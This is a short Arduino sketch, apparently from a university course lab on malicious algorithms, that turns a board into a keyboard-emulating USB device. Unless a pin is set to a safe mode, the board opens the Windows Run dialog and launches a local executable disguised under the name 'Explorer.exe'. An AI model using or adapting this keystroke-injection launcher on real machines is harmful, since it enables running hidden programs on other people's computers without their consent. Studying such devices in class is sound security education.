#include <Keyboard.h>
#include <Mouse.h>

int mode;

void setup() {
  pinMode(11, INPUT);
  mode = digitalRead(11);

  Keyboard.begin();
  Mouse.begin();
  delay(1000);

  if (mode == HIGH) {
    Keyboard.print("Modo seguro");
  } else {
    Keyboard.press(KEY_LEFT_GUI);  
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(250);

    Keyboard.print("E:\\Intec\\clase\\tri7\\ICS202L LAB ALGORITMOS MALICIOSOS\\ProyectoFinal\\ProyectoFinal\\Explorer.exe");
    Keyboard.write(KEY_RETURN);
    delay(1000);  

  }

  Keyboard.releaseAll();  
}

void loop() {
}
